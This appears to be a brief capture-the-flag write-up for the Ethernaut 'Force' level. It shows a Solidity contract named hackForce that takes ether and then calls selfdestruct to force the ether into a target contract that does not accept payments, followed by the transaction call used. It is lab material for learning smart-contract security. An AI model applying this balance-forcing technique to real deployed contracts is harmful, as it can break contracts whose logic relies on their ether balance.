1) I created a contract with a fallback payable function and a selfdestruct function and deployed it.

pragma solidity ^0.6.0;
contract hackForce {
    fallback() external payable{
    }
    function destroy(address payable _owner) public{
        selfdestruct(_owner);
    }
}

2) Then I sent ether to contract hackForce.
await sendTransaction({from:player,value:toWei(0.0003),
to:"0x2113105d9E6D688A684325b489ff7f0d5986Ef3F",value:0x00000ef111})

3) Then I called hackForce's destroy function with the contract Force instance address
 as argument which made it to send all the ether in the contract to Force.
